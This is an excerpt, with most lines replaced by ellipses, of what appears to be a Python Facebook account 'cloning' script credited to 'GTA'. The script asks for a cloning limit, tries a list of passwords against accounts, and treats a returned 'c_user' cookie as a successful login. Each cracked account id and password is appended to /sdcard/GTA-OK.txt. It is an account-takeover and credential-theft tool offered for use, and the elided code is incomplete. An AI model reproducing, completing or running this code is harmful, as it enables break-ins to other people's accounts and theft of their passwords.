...

  ...
  AUTHOR   :     GTA 
  FACEBOOK :   https://www.facebook.com/profile.php?id=100089147156284&mibextid=ZbWKwL
  GITHUB    :   
  LIFE STATUS  :  
...
def Tabii():
    ...
    print(f"")
    limit = int(input(' EXAMPLE: 1000, 2000, 5000, 100000\n\n PUT CLONING LIMIT: '))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('/sdcard/GTA-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
